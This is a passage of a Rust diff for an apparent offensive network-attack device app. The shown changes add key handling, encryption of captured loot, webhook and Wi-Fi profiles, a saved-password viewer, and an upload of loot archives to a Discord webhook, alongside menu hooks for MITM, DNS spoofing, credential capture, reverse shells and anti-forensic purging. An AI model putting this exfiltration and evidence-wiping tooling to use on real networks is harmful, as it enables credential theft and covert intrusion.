@@ -4,7 +4,7 @@ use std::{
     fs::File,
     io::{BufRead, BufReader, Write},
     path::{Component, Path, PathBuf},
-    process::Command,
+    process::{Command, Stdio},
     sync::mpsc::{self, TryRecvError},
     thread,
     time::{Duration, Instant, SystemTime},
@@ -14,24 +14,28 @@ use std::collections::HashMap;
 
 use anyhow::{anyhow, bail, Context, Result};
 use chrono::Local;
+use rand::rngs::OsRng;
+use rand::RngCore;
+use rustyjack_core::anti_forensics::perform_complete_purge;
 use rustyjack_core::cli::{
-    AutopilotCommand, AutopilotMode, AutopilotStartArgs, Commands, DiscordCommand,
-    DiscordSendArgs, DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand, EthernetDiscoverArgs,
+    AutopilotCommand, AutopilotMode, AutopilotStartArgs, Commands, DiscordCommand, DiscordSendArgs,
+    DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand, EthernetDiscoverArgs,
     EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs, HardwareCommand,
     HotspotCommand, HotspotStartArgs, LootCommand, LootReadArgs, MitmCommand, MitmStartArgs,
     NotifyCommand, ResponderArgs, ResponderCommand, ReverseCommand, ReverseLaunchArgs,
-    SystemCommand, WifiCommand, WifiDeauthArgs, WifiDisconnectArgs, WifiProfileCommand,
-    WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiRouteCommand, WifiRouteEnsureArgs,
-    WifiScanArgs, WifiStatusArgs,
+    SystemCommand, SystemFdePrepareArgs, WifiCommand, WifiDeauthArgs, WifiDisconnectArgs,
+    WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiProfileSaveArgs,
+    WifiRouteCommand, WifiRouteEnsureArgs, WifiScanArgs, WifiStatusArgs,
 };
 use rustyjack_core::{
-    apply_interface_isolation, is_wireless_interface, rfkill_index_for_interface,
-    InterfaceSummary,
+    apply_interface_isolation, is_wireless_interface, rfkill_index_for_interface, InterfaceSummary,
 };
+use rustyjack_encryption::{clear_encryption_key, set_encryption_key};
 use serde::Deserialize;
 use serde_json::{self, Value};
 use tempfile::{NamedTempFile, TempPath};
 use walkdir::WalkDir;
+use zeroize::Zeroize;
 use zip::{write::FileOptions, CompressionMethod, ZipWriter};
 
 #[cfg(target_os = "linux")]
@@ -100,12 +104,6 @@ enum StepOutcome {
     Skipped(String),
 }
 
-struct PurgeReport {
-    removed: usize,
-    service_disabled: bool,
-    errors: Vec<String>,
-}
-
 #[derive(Clone)]
 struct MitmSession {
     started: Instant,
@@ -125,6 +123,45 @@ impl App {
             Button::Key1 => ButtonAction::Refresh,
             Button::Key2 => ButtonAction::MainMenu,
             Button::Key3 => ButtonAction::Reboot,
+        }
+    }
+
+    fn try_load_saved_key(&mut self) {
+        let path = self.config.settings.encryption_key_path.clone();
+        if path.is_empty() {
+            return;
+        }
+        let key_path = PathBuf::from(path);
+        if !key_path.exists() {
+            return;
+        }
+        if let Ok(key) = self.parse_key_file(&key_path) {
+            clear_encryption_key();
+            if set_encryption_key(&key).is_ok() {
+                log::info!(
+                    "Loaded encryption key from saved path {}",
+                    key_path.display()
+                );
+            }
+            clear_encryption_key();
+        }
+    }
+
+    /// Attempt to load the saved key if none is currently loaded.
+    fn ensure_saved_key_loaded(&mut self) {
+        if rustyjack_encryption::encryption_enabled() {
+            return;
+        }
+        let path = self.config.settings.encryption_key_path.clone();
+        if path.is_empty() {
+            return;
+        }
+        let key_path = PathBuf::from(path);
+        if !key_path.exists() {
+            return;
+        }
+        if let Ok(key) = self.parse_key_file(&key_path) {
+            let _ = set_encryption_key(&key);
         }
     }
 
@@ -210,7 +247,10 @@ impl App {
     fn require_connected_wireless(&mut self, title: &str) -> Result<Option<String>> {
         let iface = self.config.settings.active_network_interface.clone();
         if iface.is_empty() {
-            self.show_message(title, ["No active interface set", "Run Hardware Detect first"])?;
+            self.show_message(
+                title,
+                ["No active interface set", "Run Hardware Detect first"],
+            )?;
             return Ok(None);
         }
 
@@ -268,19 +308,17 @@ impl App {
             interface: interface.to_string(),
         };
 
-        let result = self
-            .core
-            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Ensure(
-                args,
-            ))));
+        let result = self.core.dispatch(Commands::Wifi(WifiCommand::Route(
+            WifiRouteCommand::Ensure(args),
+        )));
 
         match result {
             Ok((msg, _)) => {
                 // Keep only the active interface alive (plus hotspot if running)
                 let mut allow_list = vec![interface.to_string()];
-                if let Ok((_, hs_data)) =
-                    self.core
-                        .dispatch(Commands::Hotspot(HotspotCommand::Status))
+                if let Ok((_, hs_data)) = self
+                    .core
+                    .dispatch(Commands::Hotspot(HotspotCommand::Status))
                 {
                     let running = hs_data
                         .get("running")
@@ -292,8 +330,7 @@ impl App {
                                 allow_list.push(ap.to_string());
                             }
                         }
-                        if let Some(up) =
-                            hs_data.get("upstream_interface").and_then(|v| v.as_str())
+                        if let Some(up) = hs_data.get("upstream_interface").and_then(|v| v.as_str())
                         {
                             if !up.is_empty() {
                                 allow_list.push(up.to_string());
@@ -494,7 +531,8 @@ impl App {
         // Spawn command in background
         thread::spawn(move || {
             let r = core.dispatch(cmd);
-            *result_clone.lock()
+            *result_clone
+                .lock()
                 .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))
                 .unwrap_or_else(|_| panic!("Failed to lock result mutex")) = Some(r);
         });
@@ -536,9 +574,11 @@ impl App {
             }
 
             // Check if completed
-            if let Some(r) = result.lock()
+            if let Some(r) = result
+                .lock()
                 .map_err(|e| anyhow::anyhow!("Result mutex poisoned: {}", e))?
-                .take() {
+                .take()
+            {
                 return Ok(Some(r?));
             }
 
@@ -657,6 +697,14 @@ enum ButtonAction {
     Reboot,
 }
 
+#[derive(Debug, Clone)]
+struct UsbDevice {
+    name: String,
+    size: String,
+    model: String,
+    transport: String,
+}
+
 impl App {
     pub fn new() -> Result<Self> {
         let core = CoreBridge::with_root(None)?;
@@ -675,7 +723,7 @@ impl App {
         // Give splash screen time to be visible (1.5 seconds)
         thread::sleep(Duration::from_millis(1500));
 
-        let app = Self {
+        let mut app = Self {
             core,
             display,
             buttons,
@@ -689,6 +737,9 @@ impl App {
         };
         // Apply log preference from config at startup so the backend honors it
         app.apply_log_setting();
+        app.try_load_saved_key();
+        rustyjack_encryption::set_wifi_profile_encryption(app.wifi_encryption_active());
+        rustyjack_encryption::set_loot_encryption(app.loot_encryption_active());
         Ok(app)
     }
 
@@ -820,6 +871,38 @@ impl App {
                     let prefix = if active { "*" } else { " " };
                     entry.label = format!("{} {}", prefix, base);
                 }
+                MenuAction::ToggleEncryptionMaster => {
+                    let state = if self.config.settings.encryption_enabled {
+                        "ON"
+                    } else {
+                        "OFF"
+                    };
+                    entry.label = format!("Encryption [{}]", state);
+                }
+                MenuAction::ToggleEncryptWebhook => {
+                    let state = if self.config.settings.encrypt_discord_webhook {
+                        "ON"
+                    } else {
+                        "OFF"
+                    };
+                    entry.label = format!("Webhook [{}]", state);
+                }
+                MenuAction::ToggleEncryptLoot => {
+                    let state = if self.config.settings.encrypt_loot {
+                        "ON"
+                    } else {
+                        "OFF"
+                    };
+                    entry.label = format!("Loot [{}]", state);
+                }
+                MenuAction::ToggleEncryptWifiProfiles => {
+                    let state = if self.config.settings.encrypt_wifi_profiles {
+                        "ON"
+                    } else {
+                        "OFF"
+                    };
+                    entry.label = format!("WiFi Profiles [{}]", state);
+                }
                 _ => {}
             }
         }
@@ -902,6 +985,7 @@ impl App {
             MenuAction::WifiStatus => self.show_wifi_status()?,
             MenuAction::WifiDisconnect => self.disconnect_wifi()?,
             MenuAction::WifiEnsureRoute => self.ensure_route()?,
+            MenuAction::ManageSavedNetworks => self.manage_saved_networks()?,
             MenuAction::ReconGateway => self.recon_gateway()?,
             MenuAction::ReconArpScan => self.recon_arp_scan()?,
             MenuAction::ReconServiceScan => self.recon_service_scan()?,
@@ -940,9 +1024,19 @@ impl App {
             MenuAction::EthernetSiteCredPipeline => self.menu_state.enter("aethp"),
             MenuAction::EthernetSiteCredCapture => self.launch_ethernet_site_cred_capture()?,
             MenuAction::BuildNetworkReport => self.build_network_report()?,
+            MenuAction::ToggleEncryptionMaster => self.toggle_encryption_master()?,
+            MenuAction::ToggleEncryptWebhook => self.toggle_encrypt_webhook()?,
+            MenuAction::ToggleEncryptLoot => self.toggle_encrypt_loot()?,
+            MenuAction::ToggleEncryptWifiProfiles => self.toggle_encrypt_wifi_profiles()?,
+            MenuAction::ImportWifiFromUsb => self.import_wifi_from_usb()?,
+            MenuAction::ImportWebhookFromUsb => self.import_webhook_from_usb()?,
             MenuAction::CompletePurge => self.complete_purge()?,
             MenuAction::PurgeLogs => self.purge_logs()?,
             MenuAction::Hotspot => self.manage_hotspot()?,
+            MenuAction::EncryptionLoadKey => self.load_encryption_key_from_usb()?,
+            MenuAction::EncryptionGenerateKey => self.generate_encryption_key_on_usb()?,
+            MenuAction::FullDiskEncryptionSetup => self.start_full_disk_encryption_flow()?,
+            MenuAction::FullDiskEncryptionMigrate => self.start_fde_migration()?,
             MenuAction::SetOperationMode(mode) => self.select_operation_mode(mode)?,
             MenuAction::ShowInfo => {} // No-op for informational entries
         }
@@ -1688,11 +1782,227 @@ impl App {
     }
 
     fn fetch_wifi_profiles(&mut self) -> Result<Vec<WifiProfileSummary>> {
-        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
-            WifiProfileCommand::List,
-        )))?;
-        let resp: WifiProfilesResponse = serde_json::from_value(data)?;
-        Ok(resp.profiles)
+        let used_key = self.ensure_wifi_key_loaded();
+        let result = (|| {
+            if self.wifi_encryption_active() && !used_key {
+                bail!("Encryption key unavailable for Wi-Fi profiles");
+            }
+            let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+                WifiProfileCommand::List,
+            )))?;
+            let resp: WifiProfilesResponse = serde_json::from_value(data)?;
+            Ok(resp.profiles)
+        })();
+        if used_key {
+            clear_encryption_key();
+        }
+        result
+    }
+
+    fn manage_saved_networks(&mut self) -> Result<()> {
+        let profiles = match self.fetch_wifi_profiles() {
+            Ok(p) => p,
+            Err(e) => {
+                return self.show_message(
+                    "Saved Networks",
+                    [
+                        "Failed to load profiles",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
+        };
+
+        if profiles.is_empty() {
+            return self.show_message("Saved Networks", ["No saved profiles found"]);
+        }
+
+        let names: Vec<String> = profiles.iter().map(|p| p.ssid.clone()).collect();
+        let Some(choice) = self.choose_from_list("Saved Networks", &names)? else {
+            return Ok(());
+        };
+        let profile = &profiles[choice];
+
+        let actions = vec![
+            "View Password".to_string(),
+            "Attempt Connection".to_string(),
+            "Delete Profile".to_string(),
+            "Back".to_string(),
+        ];
+        if let Some(action) =
+            self.choose_from_list(&format!("Profile: {}", profile.ssid), &actions)?
+        {
+            match action {
+                0 => self.view_profile_password(&profile.ssid)?,
+                1 => self.attempt_profile_connection(&profile.ssid)?,
+                2 => self.delete_profile(&profile.ssid)?,
+                _ => {}
+            }
+        }
+        Ok(())
+    }
+
+    fn view_profile_password(&mut self, ssid: &str) -> Result<()> {
+        let used_key = self.ensure_wifi_key_loaded();
+        let result = (|| {
+            if self.wifi_encryption_active() && !used_key {
+                return Ok(());
+            }
+            // Load full profile to read password
+            let args = WifiProfileConnectArgs {
+                profile: Some(ssid.to_string()),
+                ssid: None,
+                password: None,
+                interface: None,
+                remember: false,
+            };
+            let (_, data) = match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+                WifiProfileCommand::Connect(args),
+            ))) {
+                Ok(resp) => resp,
+                Err(e) => {
+                    return self.show_message(
+                        "Saved Networks",
+                        [
+                            "Failed to load profile",
+                            &shorten_for_display(&e.to_string(), 90),
+                        ],
+                    );
+                }
+            };
+
+            let pwd = data
+                .get("password")
+                .and_then(|v| v.as_str())
+                .unwrap_or("<no password>");
+
+            self.show_message(
+                "WiFi Password",
+                [format!("SSID: {ssid}"), format!("Password: {pwd}")],
+            )
+        })();
+        if used_key {
+            clear_encryption_key();
+        }
+        result
+    }
+
+    fn read_webhook_url(&mut self) -> Result<Option<String>> {
+        let enc_active = self.webhook_encryption_active();
+        let enc_path = self.root.join("discord_webhook.txt.enc");
+        let plain_path = self.root.join("discord_webhook.txt");
+
+        if enc_active {
+            self.ensure_saved_key_loaded();
+            if !rustyjack_encryption::encryption_enabled() {
+                bail!("Encryption enabled but key not loaded");
+            }
+            if enc_path.exists() {
+                let mut bytes = rustyjack_encryption::decrypt_file(&enc_path)?;
+                let mut content = String::from_utf8(bytes.clone())?.trim().to_string();
+                if content.starts_with("https://discord.com/api/webhooks/") && !content.is_empty() {
+                    // zeroize buffers before returning copy
+                    bytes.zeroize();
+                    let out = content.clone();
+                    content.zeroize();
+                    clear_encryption_key();
+                    return Ok(Some(out));
+                }
+                bytes.zeroize();
+                content.zeroize();
+                clear_encryption_key();
+            }
+        }
+
+        if plain_path.exists() {
+            let mut content = fs::read_to_string(&plain_path)?.trim().to_string();
+            if content.starts_with("https://discord.com/api/webhooks/") && !content.is_empty() {
+                let out = content.clone();
+                content.zeroize();
+                return Ok(Some(out));
+            }
+            content.zeroize();
+        }
+
+        Ok(None)
+    }
+
+    fn webhook_encryption_active(&self) -> bool {
+        self.config.settings.encryption_enabled && self.config.settings.encrypt_discord_webhook
+    }
+
+    fn loot_encryption_active(&self) -> bool {
+        self.config.settings.encryption_enabled && self.config.settings.encrypt_loot
+    }
+
+    fn wifi_encryption_active(&self) -> bool {
+        self.config.settings.encryption_enabled && self.config.settings.encrypt_wifi_profiles
+    }
+
+    /// Load the saved key if Wi-Fi profile encryption is active; returns true if a key is loaded.
+    fn ensure_wifi_key_loaded(&mut self) -> bool {
+        if !self.wifi_encryption_active() {
+            return false;
+        }
+        if !self.ensure_keyfile_available() {
+            return false;
+        }
+        true
+    }
+
+    fn attempt_profile_connection(&mut self, ssid: &str) -> Result<()> {
+        let used_key = self.ensure_wifi_key_loaded();
+        let result = (|| {
+            if self.wifi_encryption_active() && !used_key {
+                return Ok(());
+            }
+            // Scan to see if network is present
+            let scan = self.fetch_wifi_scan().ok();
+            let found = scan.as_ref().and_then(|resp| {
+                resp.networks
+                    .iter()
+                    .find(|n| n.ssid.as_deref().map(|s| s.eq_ignore_ascii_case(ssid)) == Some(true))
+            });
+
+            // Attempt connection regardless; inform user of presence.
+            let msg_presence = match found {
+                Some(_) => "Network found in scan",
+                None => "Network NOT seen in scan",
+            };
+
+            let args = WifiProfileConnectArgs {
+                profile: Some(ssid.to_string()),
+                ssid: None,
+                password: None,
+                interface: None,
+                remember: false,
+            };
+
+            match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+                WifiProfileCommand::Connect(args),
+            ))) {
+                Ok(_) => self.show_message(
+                    "Connect",
+                    [
+                        format!("Attempted connect to {ssid}"),
+                        msg_presence.to_string(),
+                        "Check Wi-Fi status for result".to_string(),
+                    ],
+                ),
+                Err(e) => self.show_message(
+                    "Connect",
+                    [
+                        format!("Failed to connect to {ssid}"),
+                        msg_presence.to_string(),
+                        shorten_for_display(&e.to_string(), 90),
+                    ],
+                ),
+            }
+        })();
+        if used_key {
+            clear_encryption_key();
+        }
+        result
     }
 
     fn fetch_wifi_interfaces(&mut self) -> Result<Vec<InterfaceSummary>> {
@@ -1728,90 +2038,188 @@ impl App {
     }
 
     fn connect_named_profile(&mut self, ssid: &str) -> Result<()> {
-        self.apply_identity_hardening();
-        self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;
-
-        let args = WifiProfileConnectArgs {
-            profile: Some(ssid.to_string()),
-            ssid: None,
-            password: None,
-            interface: None,
-            remember: false,
-        };
-
-        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
-            WifiProfileCommand::Connect(args),
-        ))) {
-            Ok(_) => {
-                let msg = vec![format!("Connected to {ssid}")];
-                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
-            }
-            Err(err) => {
-                let msg = vec![format!("Connection failed:"), format!("{err}")];
-                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
-            }
+        let used_key = self.ensure_wifi_key_loaded();
+        if self.wifi_encryption_active() && !used_key {
+            return Ok(());
         }
-        Ok(())
+        let result = (|| {
+            self.apply_identity_hardening();
+            self.show_progress("Wi-Fi", ["Connecting...", ssid, "Please wait"])?;
+
+            let args = WifiProfileConnectArgs {
+                profile: Some(ssid.to_string()),
+                ssid: None,
+                password: None,
+                interface: None,
+                remember: false,
+            };
+
+            match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+                WifiProfileCommand::Connect(args),
+            ))) {
+                Ok(_) => {
+                    let msg = vec![format!("Connected to {ssid}")];
+                    self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
+                }
+                Err(err) => {
+                    let msg = vec![format!("Connection failed:"), format!("{err}")];
+                    self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
+                }
+            }
+            Ok(())
+        })();
+        if used_key {
+            clear_encryption_key();
+        }
+        result
     }
 
     fn delete_profile(&mut self, ssid: &str) -> Result<()> {
-        let args = WifiProfileDeleteArgs {
-            ssid: ssid.to_string(),
-        };
-        match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
-            WifiProfileCommand::Delete(args),
-        ))) {
-            Ok(_) => {
-                let msg = vec![format!("Deleted {ssid}")];
-                self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
-            }
-            Err(err) => {
-                let msg = vec![format!("{err}")];
-                self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
-            }
+        let used_key = self.ensure_wifi_key_loaded();
+        if self.wifi_encryption_active() && !used_key {
+            return Ok(());
         }
-        Ok(())
+        let result = (|| {
+            let args = WifiProfileDeleteArgs {
+                ssid: ssid.to_string(),
+            };
+            match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+                WifiProfileCommand::Delete(args),
+            ))) {
+                Ok(_) => {
+                    let msg = vec![format!("Deleted {ssid}")];
+                    self.show_message("Wi-Fi", msg.iter().map(|s| s.as_str()))?;
+                }
+                Err(err) => {
+                    let msg = vec![format!("{err}")];
+                    self.show_message("Wi-Fi error", msg.iter().map(|s| s.as_str()))?;
+                }
+            }
+            Ok(())
+        })();
+        if used_key {
+            clear_encryption_key();
+        }
+        result
+    }
+
+    fn import_wifi_from_usb(&mut self) -> Result<()> {
+        let Some(file_path) = self.browse_usb_for_file("WiFi from USB", Some(&["txt"]))? else {
+            return Ok(());
+        };
+
+        let content = match fs::read_to_string(&file_path) {
+            Ok(c) => c,
+            Err(e) => {
+                return self.show_message(
+                    "Wi-Fi Import",
+                    [
+                        "Failed to read file",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
+        };
+
+        let mut lines = content.lines();
+        let ssid = lines.next().unwrap_or("").trim().to_string();
+        let password = lines.next().unwrap_or("").trim().to_string();
+
+        if ssid.is_empty() {
+            return self.show_message("Wi-Fi Import", ["SSID missing on first line"]);
+        }
+
+        let used_key = self.ensure_wifi_key_loaded();
+        if self.wifi_encryption_active() && !used_key {
+            return Ok(());
+        }
+
+        let result = (|| {
+            // Check if profile exists for messaging
+            let profiles = self.fetch_wifi_profiles().unwrap_or_default();
+            let existed = profiles.iter().any(|p| p.ssid.eq_ignore_ascii_case(&ssid));
+
+            let args = WifiProfileSaveArgs {
+                ssid: ssid.clone(),
+                password: password.clone(),
+                interface: "auto".to_string(),
+                priority: 1,
+                auto_connect: Some(true),
+            };
+
+            match self.core.dispatch(Commands::Wifi(WifiCommand::Profile(
+                WifiProfileCommand::Save(args),
+            ))) {
+                Ok(_) => {
+                    let mut msg = vec![format!(
+                        "{} profile {}",
+                        if existed { "Updated" } else { "Saved" },
+                        ssid
+                    )];
+                    if password.is_empty() {
+                        msg.push("No password provided (open network)".to_string());
+                    }
+                    msg.push("Stored under wifi/profiles".to_string());
+                    self.show_message("Wi-Fi Import", msg.iter().map(|s| s.as_str()))
+                }
+                Err(e) => self.show_message(
+                    "Wi-Fi Import",
+                    [
+                        "Failed to save profile",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                ),
+            }
+        })();
+        if used_key {
+            clear_encryption_key();
+        }
+        result
     }
 
     fn discord_upload(&mut self) -> Result<()> {
+        self.ensure_saved_key_loaded();
         // Check if webhook is configured first
-        let webhook_path = self.root.join("discord_webhook.txt");
-        let has_webhook = if webhook_path.exists() {
-            if let Ok(content) = fs::read_to_string(&webhook_path) {
-                let trimmed = content.trim();
-                trimmed.starts_with("https://discord.com/api/webhooks/") && !trimmed.is_empty()
-            } else {
-                false
+        let mut webhook = match self.read_webhook_url() {
+            Ok(Some(url)) => url,
+            Ok(None) => {
+                return self.show_message(
+                    "Discord Error",
+                    [
+                        "No webhook configured",
+                        "",
+                        "Create file:",
+                        "discord_webhook.txt",
+                        "with your webhook URL",
+                    ],
+                );
             }
-        } else {
-            false
+            Err(e) => {
+                return self.show_message(
+                    "Discord Error",
+                    [
+                        "Failed to read webhook",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
         };
-
-        if !has_webhook {
-            return self.show_message(
-                "Discord Error",
-                [
-                    "No webhook configured",
-                    "",
-                    "Create file:",
-                    "discord_webhook.txt",
-                    "with your webhook URL",
-                ],
-            );
-        }
 
         let (temp_path, archive_path) = self.build_loot_archive()?;
         let args = DiscordSendArgs {
             title: "Rustyjack Loot".to_string(),
             message: Some("Complete loot archive".to_string()),
             file: Some(archive_path.clone()),
-            target: None,
+            target: Some(webhook),
             interface: None,
         };
         let result = self.core.dispatch(Commands::Notify(NotifyCommand::Discord(
             DiscordCommand::Send(args),
         )));
         drop(temp_path);
+        // Best-effort scrub
+        webhook.zeroize();
+        clear_encryption_key();
         match result {
             Ok(_) => self.show_message("Discord", ["Loot uploaded"])?,
             Err(err) => {
@@ -1819,6 +2227,1056 @@ impl App {
                 self.show_message("Discord", [msg.as_str()])?;
             }
         }
+        Ok(())
+    }
+
+    fn import_webhook_from_usb(&mut self) -> Result<()> {
+        let Some(file_path) = self.browse_usb_for_file("Webhook from USB", Some(&["txt"]))? else {
+            return Ok(());
+        };
+
+        let mut content = match fs::read_to_string(&file_path) {
+            Ok(c) => c.trim().to_string(),
+            Err(e) => {
+                return self.show_message(
+                    "Discord",
+                    [
+                        "Failed to read file",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
+        };
+
+        if content.is_empty() {
+            return self.show_message("Discord", ["Webhook file is empty"]);
+        }
+        if !content.starts_with("https://discord.com/api/webhooks/") {
+            return self.show_message(
+                "Discord",
+                ["Invalid webhook", "Expected a Discord webhook URL"],
+            );
+        }
+
+        let enc = self.webhook_encryption_active();
+        let dest_plain = self.root.join("discord_webhook.txt");
+        let dest_enc = self.root.join("discord_webhook.txt.enc");
+        if dest_plain.exists() {
+            let _ = fs::remove_file(&dest_plain);
+        }
+        if dest_enc.exists() {
+            let _ = fs::remove_file(&dest_enc);
+        }
+
+        if enc {
+            self.ensure_saved_key_loaded();
+            if !rustyjack_encryption::encryption_enabled() {
+                return self.show_message(
+                    "Discord",
+                    ["Encryption enabled", "Load key before importing"],
+                );
+            }
+            if let Err(e) = rustyjack_encryption::encrypt_to_file(&dest_enc, content.as_bytes()) {
+                return self.show_message(
+                    "Discord",
+                    [
+                        "Failed to encrypt webhook",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
+            let res = self.show_message(
+                "Discord",
+                [
+                    "Webhook imported (enc)",
+                    &shorten_for_display(dest_enc.to_string_lossy().as_ref(), 18),
+                ],
+            );
+            content.zeroize();
+            clear_encryption_key();
+            res
+        } else {
+            if let Err(e) = fs::write(&dest_plain, &content) {
+                return self.show_message(
+                    "Discord",
+                    [
+                        "Failed to save webhook",
+                        &shorten_for_display(&e.to_string(), 90),
+                    ],
+                );
+            }
+            let res = self.show_message(
+                "Discord",
+                [
+                    "Webhook imported",
+                    &shorten_for_display(dest_plain.to_string_lossy().as_ref(), 18),
+                ],
+            );
+            content.zeroize();
+            res
+        }
+    }
+
+    fn parse_key_file(&self, path: &Path) -> Result<[u8; 32]> {
+        let data = fs::read(path)?;
+        // Try hex first
+        let content = String::from_utf8_lossy(&data).trim().to_string();
+        let hex_only = content
+            .chars()
+            .all(|c| c.is_ascii_hexdigit() || c.is_whitespace());
+        if hex_only {
+            let clean: String = content.chars().filter(|c| c.is_ascii_hexdigit()).collect();
+            if clean.len() == 64 {
+                let mut out = [0u8; 32];
+                for i in 0..32 {
+                    let byte = u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16)
+                        .map_err(|e| anyhow!("Invalid hex in key file: {e}"))?;
+                    out[i] = byte;
+                }
+                return Ok(out);
+            }
+        }
+
+        // Fallback: raw 32-byte key
+        if data.len() == 32 {
+            let mut out = [0u8; 32];
+            out.copy_from_slice(&data);
+            return Ok(out);
+        }
+
+        bail!("Key file must contain 32 raw bytes or 64 hex chars");
+    }
+
+    fn load_encryption_key_from_usb(&mut self) -> Result<()> {
+        let Some(file_path) = self.browse_usb_for_file("Load Key", Some(&["key", "txt", "enc"]))?
+        else {
+            return Ok(());
+        };
+
+        match self.parse_key_file(&file_path) {
+            Ok(key) => {
+                clear_encryption_key();
+                set_encryption_key(&key)?;
+                self.config.settings.encryption_key_path = file_path.to_string_lossy().to_string();
+                let config_path = self.root.join("gui_conf.json");
+                let _ = self.config.save(&config_path);
+                let res = self.show_message(
+                    "Encryption",
+                    [
+                        "Key loaded into RAM",
+                        &shorten_for_display(&file_path.to_string_lossy(), 18),
+                        "Path saved for next boot",
+                    ],
+                );
+                res
+            }
+            Err(e) => self.show_message(
+                "Encryption",
+                [
+                    "Failed to load key",
+                    &shorten_for_display(&e.to_string(), 90),
+                ],
+            ),
+        }
+        clear_encryption_key();
+    }
+
+    fn generate_encryption_key_on_usb(&mut self) -> Result<()> {
+        let usb_root = match self.find_usb_mount() {
+            Ok(p) => p,
+            Err(_) => {
+                return self.show_message(
+                    "Encryption",
+                    ["No USB drive detected", "Insert USB and retry"],
+                );
+            }
+        };
+
+        let key_path = usb_root.join("rustyjack.key");
+        if key_path.exists() {
+            let opts = vec!["Overwrite key".to_string(), "Cancel".to_string()];
+            if let Some(choice) = self.choose_from_list("Key exists", &opts)? {
+                if choice != 0 {
+                    return Ok(());
+                }
+            } else {
+                return Ok(());
+            }
+        }
+
+        let mut key = [0u8; 32];
+        OsRng.fill_bytes(&mut key);
+        let hex: String = key.iter().map(|b| format!("{:02x}", b)).collect();
+        fs::write(&key_path, hex.as_bytes())?;
+
+        clear_encryption_key();
+        set_encryption_key(&key)?;
+        self.config.settings.encryption_key_path = key_path.to_string_lossy().to_string();
+        let config_path = self.root.join("gui_conf.json");
+        let _ = self.config.save(&config_path);
+
+        let res = self.show_message(
+            "Encryption",
+            [
+                "New key generated",
+                &shorten_for_display(&key_path.to_string_lossy(), 18),
+                "Loaded into RAM",
+            ],
+        );
+        clear_encryption_key();
+        res
+    }
+
+    /// Disabling master encryption should walk all encryption toggles and turn them off.
+    fn toggle_encryption_master(&mut self) -> Result<()> {
+        let enabling = !self.config.settings.encryption_enabled;
+        if enabling {
+            // Require key file present and loadable
+            if !self.ensure_keyfile_available() {
+                return self.show_message(
+                    "Encryption",
+                    [
+                        "Load or generate a keyfile first",
+                        "Use Encryption menu to set key",
+                    ],
+                );
+            }
+            self.config.settings.encryption_enabled = true;
+        } else {
+            // When disabling, verify key presence and ask for confirmation
+            if !self.ensure_keyfile_available() {
+                return self.show_message(
+                    "Encryption",
+                    [
+                        "Keyfile missing or invalid",
+                        "Set correct key path before disabling",
+                    ],
+                );
+            }
+
+            let options = vec!["Yes - decrypt all now".to_string(), "Cancel".to_string()];
+            self.show_message(
+                "Turn off encryption?",
+                [
+                    "All encrypted items will be decrypted.",
+                    "Do NOT remove power; uncancellable.",
+                ],
+            )?;
+            let confirm = self.choose_from_list("Proceed?", &options)?;
+            if confirm != Some(0) {
+                return Ok(());
+            }
+
+            self.disable_all_encryptions()?;
+            self.config.settings.encryption_enabled = false;
+        }
+        rustyjack_encryption::set_wifi_profile_encryption(self.wifi_encryption_active());
+        let _ = self.config.save(&self.root.join("gui_conf.json"));
+        let res = self.show_message(
+            "Encryption",
+            [format!(
+                "Encryption {}",
+                if self.config.settings.encryption_enabled {
+                    "ENABLED"
+                } else {
+                    "DISABLED"
+                }
+            )],
+        );
+        clear_encryption_key();
+        res
+    }
+
+    fn ensure_keyfile_available(&mut self) -> bool {
+        let path_str = self.config.settings.encryption_key_path.clone();
+        if path_str.is_empty() {
+            let _ = self.show_message(
+                "Encryption",
+                ["No keyfile path set", "Generate or load a key first"],
+            );
+            return false;
+        }
+        let path = PathBuf::from(&path_str);
+        if !path.exists() {
+            let _ = self.show_message(
+                "Encryption",
+                [
+                    "Keyfile missing at saved path",
+                    &shorten_for_display(&path_str, 18),
+                ],
+            );
+            return false;
+        }
+        match self.parse_key_file(&path) {
+            Ok(key) => {
+                clear_encryption_key();
+                if let Err(e) = set_encryption_key(&key) {
+                    let _ = self.show_message(
+                        "Encryption",
+                        [
+                            "Failed to load key",
+                            &shorten_for_display(&e.to_string(), 90),
+                        ],
+                    );
+                    false
+                } else {
+                    true
+                }
+            }
+            Err(e) => {
+                let _ = self.show_message(
+                    "Encryption",
+                    ["Invalid keyfile", &shorten_for_display(&e.to_string(), 90)],
+                );
+                false
+            }
+        }
+    }
+
+    fn list_usb_devices(&self) -> Result<Vec<UsbDevice>> {
+        let output = Command::new("lsblk")
+            .args(["-nrpo", "NAME,RM,SIZE,MODEL,TRAN"])
+            .output()
+            .context("listing block devices")?;
+        if !output.status.success() {
+            bail!("lsblk failed with status {:?}", output.status.code());
+        }
